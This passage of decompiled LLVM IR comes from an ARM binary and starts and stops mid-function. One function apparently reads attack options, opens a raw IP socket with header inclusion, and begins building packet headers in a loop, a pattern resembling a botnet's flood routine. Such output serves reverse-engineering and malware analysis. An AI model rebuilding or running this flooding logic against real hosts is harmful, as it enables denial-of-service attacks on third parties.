  %v0_a6c0 = load i32, i32* %r1.global-to-local, align 4
  %v1_a6c0 = add i32 %v0_a6c0, 4
  store i32 %v1_a6c0, i32* %r1.global-to-local, align 4
  %v5_a6c4 = call i32 @function_13bdc(i32 %v2_a6b4, i32 %v1_a6c0, i32 ptrtoint (i32* @global_var_c6fc.74 to i32), i32 3)
  %v2_a6c8 = load i8, i8* bitcast (i8** @global_var_1e3b0.55 to i8*), align 4
  %v3_a6c8 = zext i8 %v2_a6c8 to i32
  store i32 %v3_a6c8, i32* %r3.global-to-local, align 4
  store i32 %v5_a6c4, i32* %ip.global-to-local, align 4
  %v0_a6d0 = load i32, i32* @r5, align 4
  %v5_a6d0 = mul nuw nsw i32 %v3_a6c8, 4
  %v6_a6d0 = add i32 %v5_a6d0, %v5_a6c4
  %v7_a6d0 = inttoptr i32 %v6_a6d0 to i32*
  store i32 %v0_a6d0, i32* %v7_a6d0, align 4
  %v0_a6d4 = load i32, i32* %r3.global-to-local, align 4
  %v1_a6d4 = load i32, i32* @r7, align 4
  %v2_a6d4 = add i32 %v1_a6d4, %v0_a6d4
  store i32 %v2_a6d4, i32* %r2.global-to-local, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  %v0_a6e0 = load i32, i32* %ip.global-to-local, align 4
  %v1_a6e0 = load i32, i32* @r6, align 4
  %v2_a6e0 = inttoptr i32 %v1_a6e0 to i32*
  store i32 %v0_a6e0, i32* %v2_a6e0, align 4
  %v0_a6e4 = load i32, i32* %r2.global-to-local, align 4
  %v1_a6e4 = trunc i32 %v0_a6e4 to i8
  %v2_a6e4 = load i32, i32* @r4, align 4
  %v3_a6e4 = inttoptr i32 %v2_a6e4 to i8*
  store i8 %v1_a6e4, i8* %v3_a6e4, align 1
  %v2_a6e8 = call i32 @function_13a94(i32 %v1_a6d4, i32 8)
  %v2_a6ec = load i8, i8* bitcast (i8** @global_var_1e3b0.55 to i8*), align 4
  %v3_a6ec = zext i8 %v2_a6ec to i32
  store i32 ptrtoint (i32* @global_var_bf88.76 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_a6e8, i32* @r5, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  %v3_a6fc = mul nuw nsw i32 %v3_a6ec, 4
  store i32 %v3_a6fc, i32* %r1.global-to-local, align 4
  %v2_a700 = load i32, i32* @global_var_1e3b4.57, align 4
  %v2_a704 = inttoptr i32 %v2_a6e8 to i32*
  store i32 ptrtoint (i32* @global_var_bf88.76 to i32), i32* %v2_a704, align 4
  %v3_a708 = load i32, i32* @r5, align 4
  %v4_a708 = add i32 %v3_a708, 4
  %v5_a708 = inttoptr i32 %v4_a708 to i8*
  store i8 4, i8* %v5_a708, align 1
  %v0_a70c = load i32, i32* %r1.global-to-local, align 4
  %v1_a70c = add i32 %v0_a70c, 4
  store i32 %v1_a70c, i32* %r1.global-to-local, align 4
  %v5_a710 = call i32 @function_13bdc(i32 %v2_a700, i32 %v1_a70c, i32 ptrtoint (i32* @global_var_bf88.76 to i32), i32 4)
  %v2_a714 = load i8, i8* bitcast (i8** @global_var_1e3b0.55 to i8*), align 4
  %v3_a714 = zext i8 %v2_a714 to i32
  store i32 %v3_a714, i32* %r3.global-to-local, align 4
  store i32 %v5_a710, i32* %ip.global-to-local, align 4
  %v0_a71c = load i32, i32* @r5, align 4
  %v5_a71c = mul nuw nsw i32 %v3_a714, 4
  %v6_a71c = add i32 %v5_a71c, %v5_a710
  %v7_a71c = inttoptr i32 %v6_a71c to i32*
  store i32 %v0_a71c, i32* %v7_a71c, align 4
  %v0_a720 = load i32, i32* %r3.global-to-local, align 4
  %v1_a720 = load i32, i32* @r7, align 4
  %v2_a720 = add i32 %v1_a720, %v0_a720
  store i32 %v2_a720, i32* %r2.global-to-local, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  %v0_a72c = load i32, i32* %ip.global-to-local, align 4
  %v1_a72c = load i32, i32* @r6, align 4
  %v2_a72c = inttoptr i32 %v1_a72c to i32*
  store i32 %v0_a72c, i32* %v2_a72c, align 4
  %v0_a730 = load i32, i32* %r2.global-to-local, align 4
  %v1_a730 = trunc i32 %v0_a730 to i8
  %v2_a730 = load i32, i32* @r4, align 4
  %v3_a730 = inttoptr i32 %v2_a730 to i8*
  store i8 %v1_a730, i8* %v3_a730, align 1
  %v2_a734 = call i32 @function_13a94(i32 %v1_a720, i32 8)
  %v2_a738 = load i8, i8* bitcast (i8** @global_var_1e3b0.55 to i8*), align 4
  %v3_a738 = zext i8 %v2_a738 to i32
  store i32 ptrtoint (i32* @global_var_b728.78 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_a734, i32* @r5, align 4
  store i32 5, i32* %r3.global-to-local, align 4
  %v3_a748 = mul nuw nsw i32 %v3_a738, 4
  store i32 %v3_a748, i32* %r1.global-to-local, align 4
  %v2_a74c = load i32, i32* @global_var_1e3b4.57, align 4
  %v2_a750 = inttoptr i32 %v2_a734 to i32*
  store i32 ptrtoint (i32* @global_var_b728.78 to i32), i32* %v2_a750, align 4
  %v3_a754 = load i32, i32* @r5, align 4
  %v4_a754 = add i32 %v3_a754, 4
  %v5_a754 = inttoptr i32 %v4_a754 to i8*
  store i8 5, i8* %v5_a754, align 1
  %v0_a758 = load i32, i32* %r1.global-to-local, align 4
  %v1_a758 = add i32 %v0_a758, 4
  store i32 %v1_a758, i32* %r1.global-to-local, align 4
  %v5_a75c = call i32 @function_13bdc(i32 %v2_a74c, i32 %v1_a758, i32 ptrtoint (i32* @global_var_b728.78 to i32), i32 5)
  %v2_a760 = load i8, i8* bitcast (i8** @global_var_1e3b0.55 to i8*), align 4
  %v3_a760 = zext i8 %v2_a760 to i32
  store i32 %v3_a760, i32* %r3.global-to-local, align 4
  store i32 %v5_a75c, i32* %ip.global-to-local, align 4
  %v0_a768 = load i32, i32* @r5, align 4
  %v5_a768 = mul nuw nsw i32 %v3_a760, 4
  %v6_a768 = add i32 %v5_a768, %v5_a75c
  %v7_a768 = inttoptr i32 %v6_a768 to i32*
  store i32 %v0_a768, i32* %v7_a768, align 4
  %v0_a76c = load i32, i32* %r3.global-to-local, align 4
  %v1_a76c = load i32, i32* @r7, align 4
  %v2_a76c = add i32 %v1_a76c, %v0_a76c
  store i32 %v2_a76c, i32* %r2.global-to-local, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  %v0_a778 = load i32, i32* %ip.global-to-local, align 4
  %v1_a778 = load i32, i32* @r6, align 4
  %v2_a778 = inttoptr i32 %v1_a778 to i32*
  store i32 %v0_a778, i32* %v2_a778, align 4
  %v0_a77c = load i32, i32* %r2.global-to-local, align 4
  %v1_a77c = trunc i32 %v0_a77c to i8
  %v2_a77c = load i32, i32* @r4, align 4
  %v3_a77c = inttoptr i32 %v2_a77c to i8*
  store i8 %v1_a77c, i8* %v3_a77c, align 1
  %v2_a780 = call i32 @function_13a94(i32 %v1_a76c, i32 8)
  %v2_a784 = load i8, i8* bitcast (i8** @global_var_1e3b0.55 to i8*), align 4
  %v3_a784 = zext i8 %v2_a784 to i32
  store i32 ptrtoint (i32* @global_var_b00c.80 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_a780, i32* @r5, align 4
  store i32 6, i32* %r3.global-to-local, align 4
  %v3_a794 = mul nuw nsw i32 %v3_a784, 4
  store i32 %v3_a794, i32* %r1.global-to-local, align 4
  %v2_a798 = load i32, i32* @global_var_1e3b4.57, align 4
  %v2_a79c = inttoptr i32 %v2_a780 to i32*
  store i32 ptrtoint (i32* @global_var_b00c.80 to i32), i32* %v2_a79c, align 4
  %v3_a7a0 = load i32, i32* @r5, align 4
  %v4_a7a0 = add i32 %v3_a7a0, 4
  %v5_a7a0 = inttoptr i32 %v4_a7a0 to i8*
  store i8 6, i8* %v5_a7a0, align 1
  %v0_a7a4 = load i32, i32* %r1.global-to-local, align 4
  %v1_a7a4 = add i32 %v0_a7a4, 4
  store i32 %v1_a7a4, i32* %r1.global-to-local, align 4
  %v5_a7a8 = call i32 @function_13bdc(i32 %v2_a798, i32 %v1_a7a4, i32 ptrtoint (i32* @global_var_b00c.80 to i32), i32 6)
  %v2_a7ac = load i8, i8* bitcast (i8** @global_var_1e3b0.55 to i8*), align 4
  %v3_a7ac = zext i8 %v2_a7ac to i32
  store i32 %v3_a7ac, i32* %r3.global-to-local, align 4
  store i32 %v5_a7a8, i32* %ip.global-to-local, align 4
  %v0_a7b4 = load i32, i32* @r5, align 4
  %v5_a7b4 = mul nuw nsw i32 %v3_a7ac, 4
  %v6_a7b4 = add i32 %v5_a7b4, %v5_a7a8
  %v7_a7b4 = inttoptr i32 %v6_a7b4 to i32*
  store i32 %v0_a7b4, i32* %v7_a7b4, align 4
  %v0_a7b8 = load i32, i32* %r3.global-to-local, align 4
  %v1_a7b8 = load i32, i32* @r7, align 4
  %v2_a7b8 = add i32 %v1_a7b8, %v0_a7b8
  store i32 %v2_a7b8, i32* %r2.global-to-local, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  %v0_a7c4 = load i32, i32* %ip.global-to-local, align 4
  %v1_a7c4 = load i32, i32* @r6, align 4
  %v2_a7c4 = inttoptr i32 %v1_a7c4 to i32*
  store i32 %v0_a7c4, i32* %v2_a7c4, align 4
  %v0_a7c8 = load i32, i32* %r2.global-to-local, align 4
  %v1_a7c8 = trunc i32 %v0_a7c8 to i8
  %v2_a7c8 = load i32, i32* @r4, align 4
  %v3_a7c8 = inttoptr i32 %v2_a7c8 to i8*
  store i8 %v1_a7c8, i8* %v3_a7c8, align 1
  %v2_a7cc = call i32 @function_13a94(i32 %v1_a7b8, i32 8)
  %v2_a7d0 = load i8, i8* bitcast (i8** @global_var_1e3b0.55 to i8*), align 4
  %v3_a7d0 = zext i8 %v2_a7d0 to i32
  store i32 ptrtoint (i32* @global_var_a890.82 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_a7cc, i32* @r5, align 4
  store i32 7, i32* %r3.global-to-local, align 4
  %v3_a7e0 = mul nuw nsw i32 %v3_a7d0, 4
  store i32 %v3_a7e0, i32* %r1.global-to-local, align 4
  %v2_a7e4 = load i32, i32* @global_var_1e3b4.57, align 4
  %v2_a7e8 = inttoptr i32 %v2_a7cc to i32*
  store i32 ptrtoint (i32* @global_var_a890.82 to i32), i32* %v2_a7e8, align 4
  %v3_a7ec = load i32, i32* @r5, align 4
  %v4_a7ec = add i32 %v3_a7ec, 4
  %v5_a7ec = inttoptr i32 %v4_a7ec to i8*
  store i8 7, i8* %v5_a7ec, align 1
  %v0_a7f0 = load i32, i32* %r1.global-to-local, align 4
  %v1_a7f0 = add i32 %v0_a7f0, 4
  store i32 %v1_a7f0, i32* %r1.global-to-local, align 4
  %v5_a7f4 = call i32 @function_13bdc(i32 %v2_a7e4, i32 %v1_a7f0, i32 ptrtoint (i32* @global_var_a890.82 to i32), i32 7)
  %v2_a7f8 = load i8, i8* bitcast (i8** @global_var_1e3b0.55 to i8*), align 4
  %v3_a7f8 = zext i8 %v2_a7f8 to i32
  store i32 %v3_a7f8, i32* %r3.global-to-local, align 4
  store i32 %v5_a7f4, i32* %ip.global-to-local, align 4
  %v0_a800 = load i32, i32* @r5, align 4
  %v5_a800 = mul nuw nsw i32 %v3_a7f8, 4
  %v6_a800 = add i32 %v5_a800, %v5_a7f4
  %v7_a800 = inttoptr i32 %v6_a800 to i32*
  store i32 %v0_a800, i32* %v7_a800, align 4
  %v0_a804 = load i32, i32* %r3.global-to-local, align 4
  %v1_a804 = load i32, i32* @r7, align 4
  %v2_a804 = add i32 %v1_a804, %v0_a804
  store i32 %v2_a804, i32* %r2.global-to-local, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  %v1_a810 = trunc i32 %v2_a804 to i8
  %v2_a810 = load i32, i32* @r4, align 4
  %v3_a810 = inttoptr i32 %v2_a810 to i8*
  store i8 %v1_a810, i8* %v3_a810, align 1
  %v0_a814 = load i32, i32* %ip.global-to-local, align 4
  %v1_a814 = load i32, i32* @r6, align 4
  %v2_a814 = inttoptr i32 %v1_a814 to i32*
  store i32 %v0_a814, i32* %v2_a814, align 4
  %v2_a818 = call i32 @function_13a94(i32 %v1_a804, i32 8)
  %v2_a81c = load i8, i8* bitcast (i8** @global_var_1e3b0.55 to i8*), align 4
  %v3_a81c = zext i8 %v2_a81c to i32
  store i32 ptrtoint (i32* @global_var_81cc.84 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_a818, i32* @r5, align 4
  store i32 10, i32* %r3.global-to-local, align 4
  %v3_a82c = mul nuw nsw i32 %v3_a81c, 4
  store i32 %v3_a82c, i32* %r1.global-to-local, align 4
  %v2_a830 = load i32, i32* @global_var_1e3b4.57, align 4
  %v2_a834 = inttoptr i32 %v2_a818 to i32*
  store i32 ptrtoint (i32* @global_var_81cc.84 to i32), i32* %v2_a834, align 4
  %v3_a838 = load i32, i32* @r5, align 4
  %v4_a838 = add i32 %v3_a838, 4
  %v5_a838 = inttoptr i32 %v4_a838 to i8*
  store i8 10, i8* %v5_a838, align 1
  %v0_a83c = load i32, i32* %r1.global-to-local, align 4
  %v1_a83c = add i32 %v0_a83c, 4
  store i32 %v1_a83c, i32* %r1.global-to-local, align 4
  %v5_a840 = call i32 @function_13bdc(i32 %v2_a830, i32 %v1_a83c, i32 ptrtoint (i32* @global_var_81cc.84 to i32), i32 10)
  %v2_a844 = load i8, i8* bitcast (i8** @global_var_1e3b0.55 to i8*), align 4
  %v3_a844 = zext i8 %v2_a844 to i32
  store i32 %v3_a844, i32* %r3.global-to-local, align 4
  %v1_a848 = load i32, i32* @r6, align 4
  %v2_a848 = inttoptr i32 %v1_a848 to i32*
  store i32 %v5_a840, i32* %v2_a848, align 4
  %v0_a84c = load i32, i32* @r5, align 4
  %v2_a84c = load i32, i32* %r3.global-to-local, align 4
  %v5_a84c = mul i32 %v2_a84c, 4
  %v6_a84c = add i32 %v5_a84c, %v5_a840
  %v7_a84c = inttoptr i32 %v6_a84c to i32*
  store i32 %v0_a84c, i32* %v7_a84c, align 4
  %v0_a850 = load i32, i32* %r3.global-to-local, align 4
  %v1_a850 = load i32, i32* @r7, align 4
  %v2_a850 = add i32 %v1_a850, %v0_a850
  store i32 %v2_a850, i32* %r2.global-to-local, align 4
  %v1_a858 = trunc i32 %v2_a850 to i8
  %v2_a858 = load i32, i32* @r4, align 4
  %v3_a858 = inttoptr i32 %v2_a858 to i8*
  store i8 %v1_a858, i8* %v3_a858, align 1
  %v2_a85c = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_a85c, i32* @r4, align 4
  store i32 %v6_a558, i32* @r5, align 4
  store i32 %v9_a558, i32* @r6, align 4
  store i32 %v12_a558, i32* @r7, align 4
  ret i32 %v1_a850

; uselistorder directives
  uselistorder i32 %v1_a850, { 1, 0 }
  uselistorder i32 %v1_a804, { 1, 0 }
  uselistorder i32 %v1_a7b8, { 1, 0 }
  uselistorder i32 %v1_a76c, { 1, 0 }
  uselistorder i32 %v1_a720, { 1, 0 }
  uselistorder i32 %v1_a6d4, { 1, 0 }
  uselistorder i32 %v1_a688, { 1, 0 }
  uselistorder i32 %v1_a63c, { 1, 0 }
  uselistorder i32 %v1_a5f0, { 1, 0 }
  uselistorder i8 7, { 4, 5, 6, 7, 0, 1, 2, 3 }
  uselistorder i32* @global_var_1e3b4.57, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 11, 10 }
  uselistorder i8* bitcast (i8** @global_var_1e3b0.55 to i8*), { 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
}

define i32 @function_a890(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_a890:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-50 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %v3_a890 = load i32, i32* @r4, align 4
  %v15_a890 = load i32, i32* @r8, align 4
  %v21_a890 = load i32, i32* @sl, align 4
  %v1_a894 = urem i32 %arg1, 256
  store i32 %v1_a894, i32* @fp, align 4
  store i32 %arg2, i32* @sb, align 4
  store i32 %v1_a894, i32* %r0.global-to-local, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 %arg4, i32* @r5, align 4
  %v1_a8ac = urem i32 %arg3, 256
  store i32 %v1_a8ac, i32* @r4, align 4
  %v2_a8b0 = call i32 @function_13a94(i32 %v1_a894, i32 4)
  %v0_a8b4 = load i32, i32* @r5, align 4
  store i32 %v0_a8b4, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_a8c4 = load i32, i32* @r4, align 4
  store i32 %v0_a8c4, i32* %r0.global-to-local, align 4
  %v5_a8c8 = inttoptr i32 %v0_a8b4 to i32*
  %v6_a8c8 = call i32 @function_a4e8(i32 %v0_a8c4, i32* %v5_a8c8, i32 2, i32 0)
  %v1_a8d4 = urem i32 %v6_a8c8, 256
  store i32 %v1_a8d4, i32* %ip.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_10000.26 to i32), i32 -1), i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_a8e0 = load i32, i32* @r5, align 4
  store i32 %v0_a8e0, i32* %r1.global-to-local, align 4
  %v0_a8e4 = load i32, i32* @r4, align 4
  store i32 %v0_a8e4, i32* %r0.global-to-local, align 4
  %v5_a8e8 = trunc i32 %v6_a8c8 to i8
  %v6_a8ec = inttoptr i32 %v0_a8e0 to i32*
  %v7_a8ec = call i32 @function_a4e8(i32 %v0_a8e4, i32* %v6_a8ec, i32 3, i32 add (i32 ptrtoint (i32* @global_var_10000.26 to i32), i32 -1))
  %v0_a8f0 = load i32, i32* @r5, align 4
  store i32 %v0_a8f0, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 %v7_a8ec, i32* @r7, align 4
  %v0_a900 = load i32, i32* @r4, align 4
  store i32 %v0_a900, i32* %r0.global-to-local, align 4
  %v4_a904 = inttoptr i32 %v0_a8f0 to i32*
  %v5_a904 = call i32 @function_a4e8(i32 %v0_a900, i32* %v4_a904, i32 4, i32 64)
  %v1_a90c = urem i32 %v5_a904, 256
  store i32 %v1_a90c, i32* %ip.global-to-local, align 4
  %v0_a910 = load i32, i32* @r5, align 4
  store i32 %v0_a910, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_a91c = load i32, i32* @r4, align 4
  store i32 %v0_a91c, i32* %r0.global-to-local, align 4
  %v5_a920 = trunc i32 %v5_a904 to i8
  %v6_a924 = inttoptr i32 %v0_a910 to i32*
  %v7_a924 = call i32 @function_a4e8(i32 %v0_a91c, i32* %v6_a924, i32 5, i32 1)
  %v1_a930 = urem i32 %v7_a924, 256
  store i32 %v1_a930, i32* %ip.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_10000.26 to i32), i32 -1), i32* %r3.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v0_a93c = load i32, i32* @r5, align 4
  store i32 %v0_a93c, i32* %r1.global-to-local, align 4
  %v0_a940 = load i32, i32* @r4, align 4
  store i32 %v0_a940, i32* %r0.global-to-local, align 4
  %v5_a948 = inttoptr i32 %v0_a93c to i32*
  %v6_a948 = call i32 @function_a4e8(i32 %v0_a940, i32* %v5_a948, i32 6, i32 add (i32 ptrtoint (i32* @global_var_10000.26 to i32), i32 -1))
  %v0_a950 = load i32, i32* @r5, align 4
  store i32 %v0_a950, i32* %r1.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_10000.26 to i32), i32 -1), i32* %r3.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  store i32 %v6_a948, i32* @sl, align 4
  %v0_a960 = load i32, i32* @r4, align 4
  store i32 %v0_a960, i32* %r0.global-to-local, align 4
  %v4_a964 = inttoptr i32 %v0_a950 to i32*
  %v5_a964 = call i32 @function_a4e8(i32 %v0_a960, i32* %v4_a964, i32 7, i32 add (i32 ptrtoint (i32* @global_var_10000.26 to i32), i32 -1))
  %v0_a968 = load i32, i32* @r5, align 4
  store i32 %v0_a968, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 512, i32* %r3.global-to-local, align 4
  store i32 %v5_a964, i32* @r8, align 4
  %v0_a978 = load i32, i32* @r4, align 4
  store i32 %v0_a978, i32* %r0.global-to-local, align 4
  %v4_a97c = inttoptr i32 %v0_a968 to i32*
  %v5_a97c = call i32 @function_a4e8(i32 %v0_a978, i32* %v4_a97c, i32 0, i32 512)
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_a98c = load i32, i32* @r5, align 4
  store i32 %v0_a98c, i32* %r1.global-to-local, align 4
  %v0_a990 = load i32, i32* @r4, align 4
  store i32 %v0_a990, i32* %r0.global-to-local, align 4
  %v4_a994 = inttoptr i32 %v0_a98c to i32*
  %v5_a994 = call i32 @function_a4e8(i32 %v0_a990, i32* %v4_a994, i32 1, i32 1)
  %v1_a99c = urem i32 %v5_a994, 256
  store i32 %v1_a99c, i32* %ip.global-to-local, align 4
  %v0_a9a0 = load i32, i32* @r5, align 4
  store i32 %v0_a9a0, i32* %r1.global-to-local, align 4
  store i32 19, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_a9ac = load i32, i32* @r4, align 4
  store i32 %v0_a9ac, i32* %r0.global-to-local, align 4
  %v5_a9b4 = inttoptr i32 %v0_a9a0 to i32*
  %v6_a9b4 = call i32 @function_a4e8(i32 %v0_a9ac, i32* %v5_a9b4, i32 19, i32 0)
  %v0_a9bc = load i32, i32* @r5, align 4
  store i32 %v0_a9bc, i32* %r1.global-to-local, align 4
  %v2_a9c0 = load i32, i32* @global_var_1e46c.86, align 4
  store i32 %v2_a9c0, i32* %r3.global-to-local, align 4
  store i32 %v6_a9b4, i32* @r6, align 4
  store i32 25, i32* %r2.global-to-local, align 4
  %v0_a9cc = load i32, i32* @r4, align 4
  store i32 %v0_a9cc, i32* %r0.global-to-local, align 4
  %v4_a9d0 = inttoptr i32 %v0_a9bc to i32*
  %v5_a9d0 = call i32 @function_a4e8(i32 %v0_a9cc, i32* %v4_a9d0, i32 25, i32 %v2_a9c0)
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v3_a9e4 = call i32 @function_13790(i32 2, i32 3, i32 6)
  store i32 %v3_a9e4, i32* %r0.global-to-local, align 4
  %v7_a9e8 = icmp eq i32 %v3_a9e4, -1
  store i1 %v7_a9e8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_a9e8, label %dec_label_pc_aecc, label %dec_label_pc_a9f4

dec_label_pc_a9f4:                                ; preds = %dec_label_pc_a890
  store i32 1, i32* %stack_var_-40, align 4
  %v6_a9fc = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v6_a9fc, i32* %r3.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v6_aa10 = call i32 @function_13760(i32 %v3_a9e4, i32 0, i32 3, i32* nonnull %stack_var_-40, i32 4)
  store i32 %v6_aa10, i32* %r0.global-to-local, align 4
  %v7_aa14 = icmp eq i32 %v6_aa10, -1
  store i1 %v7_aa14, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_aa14, label %dec_label_pc_aec4, label %dec_label_pc_aa1c

dec_label_pc_aa1c:                                ; preds = %dec_label_pc_a9f4
  %v0_aa1c = load i32, i32* @sl, align 4
  %v3_aa1c = mul i32 %v0_aa1c, 65536
  store i32 %v3_aa1c, i32* %sl.global-to-local, align 4
  %v0_aa20 = load i32, i32* @r8, align 4
  %v3_aa20 = mul i32 %v0_aa20, 65536
  store i32 %v3_aa20, i32* %r8.global-to-local, align 4
  %v0_aa28 = load i32, i32* @r7, align 4
  %v3_aa28 = mul i32 %v0_aa28, 65536
  %v0_aa2c = load i32, i32* @r6, align 4
  %v1_aa2c = urem i32 %v0_aa2c, 256
  store i32 0, i32* %stack_var_-40, align 4
  %v3_aa34 = urem i32 %v0_aa28, 65536
  store i32 %v3_aa34, i32* %r2.global-to-local, align 4
  %v3_aa38 = urem i32 %v0_aa1c, 65536
  store i32 %v3_aa38, i32* %r3.global-to-local, align 4
  %v3_aa3c = urem i32 %v0_aa20, 65536
  store i32 %v3_aa3c, i32* %r1.global-to-local, align 4
  %v0_aa40 = load i32, i32* @fp, align 4
  %v2_aa40 = icmp eq i32 %v0_aa40, 0
  store i1 %v2_aa40, i1* %cpsr_z.global-to-local, align 1
  %tmp88 = icmp slt i32 %v0_aa40, 1
  br i1 %tmp88, label %dec_label_pc_afec, label %dec_label_pc_aa60

dec_label_pc_aa60:                                ; preds = %dec_label_pc_aa1c
  %v3_aa64 = mul i32 %v5_a97c, 65536
  %v0_aa28.not = or i32 %v0_aa28, -65536
  %v1_aa6c = xor i32 %v0_aa28.not, 65535
  %v1_aa74 = add i32 %v3_aa64, 4325376
  %v1_aa78 = urem i32 %v0_aa1c, 256
  %v3_aa80 = udiv i32 %v1_aa74, 256
  %v1_aa84 = add i32 %v3_aa64, 524288
  %v1_aa8c = add i32 %v3_aa64, 1835008
  %v1_aa90 = urem i32 %v0_aa20, 256
  %v1_aa94 = and i32 %v3_aa80, 65280
  store i32 %v1_aa94, i32* %r0.global-to-local, align 4
  %v3_aa9c = udiv i32 %v1_aa8c, 256
  %tmp89 = mul nsw i32 %v1_aa6c, 256
  %v1_aab4 = and i32 %v3_aa9c, 65280
  store i32 %v1_aab4, i32* %ip.global-to-local, align 4
  %v1_aab8 = and i32 %tmp89, 65280
  store i32 %v1_aab8, i32* @lr, align 4
  %tmp91 = udiv i32 %v1_aa6c, 256
  %v4_aaa4 = sdiv i32 %v1_aa74, 16777216
  %v5_aad4 = trunc i32 %tmp91 to i8
  %v3_aae0 = mul nuw nsw i32 %v1_aa78, 256
  %v3_aae8 = ashr i32 %v1_aa74, 31
  %v3_aaec = mul nuw nsw i32 %v1_aa90, 256
  store i32 %v3_aaec, i32* @r5, align 4
  %tmp92 = udiv i32 %v0_aa1c, 256
  %v4_aaf0 = urem i32 %tmp92, 256
  %v5_aaf0 = or i32 %v4_aaf0, %v3_aae0
  store i32 %v5_aaf0, i32* @r7, align 4
  %v3_aaf4 = udiv i32 %v1_aa84, 256
  %tmp93 = udiv i32 %v0_aa20, 256
  %v4_aaf8 = urem i32 %tmp93, 256
  %v5_aaf8 = or i32 %v4_aaf8, %v3_aaec
  store i32 %v5_aaf8, i32* %sl.global-to-local, align 4
  %v5_aafc = trunc i32 %v3_aae8 to i8
  %v3_ab04 = sdiv i32 %v3_aa28, 16777216
  %v7_ab04 = sdiv i32 %v1_aa8c, 16777216
  %v1_ab08 = and i32 %v3_aaf4, 65280
  store i32 %v1_ab08, i32* @r6, align 4
  %v3_ab0c = ashr i32 %v3_aa28, 31
  %v3_ab10 = ashr i32 %v1_aa8c, 31
  %v3_ab14 = udiv i32 %v1_aa6c, 65536
  %v4_ab18 = udiv i32 %v1_aa84, 16777216
  %v5_ab18 = or i32 %v4_ab18, %v1_ab08
  store i32 %v5_ab18, i32* %r8.global-to-local, align 4
  store i32 %v1_aa78, i32* %r1.global-to-local, align 4
  store i32 %v1_aa90, i32* %r2.global-to-local, align 4
  %v3_ab3037 = udiv i32 %v1_ab08, 256
  store i32 %v3_ab3037, i32* %r3.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %v4_ab90 = sext i8 %v5_a920 to i32
  %v2_ac90 = icmp eq i32 %v1_aa2c, 0
  %sext16 = mul i32 %v0_aa1c, 16777216
  %v4_aca4 = sdiv i32 %sext16, 16777216
  %sext17 = mul i32 %v1_aa84, 256
  %v4_acb8 = sdiv i32 %sext17, 16777216
  %sext18 = mul i32 %v0_aa20, 16777216
  %v4_acc0 = sdiv i32 %sext18, 16777216
  %v1_acc8 = trunc i32 %v4_acb8 to i8
  br label %dec_label_pc_ab44

dec_label_pc_ab44:                                ; preds = %bb105, %dec_label_pc_aa60
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 1510, i32* %r0.global-to-local, align 4
  %v2_ab50 = call i32 @function_13a94(i32 1510, i32 4)
  store i32 %v2_ab50, i32* %r0.global-to-local, align 4
  store i32 %v2_a8b0, i32* %r1.global-to-local, align 4
  %v3_ab58 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_ab58, i32* %r3.global-to-local, align 4
  %v2_ab5c = load i32, i32* @r4, align 4
  %v5_ab5c = mul i32 %v2_ab5c, 4
  %v6_ab5c = add i32 %v5_ab5c, %v2_a8b0
  %v7_ab5c = inttoptr i32 %v6_ab5c to i32*
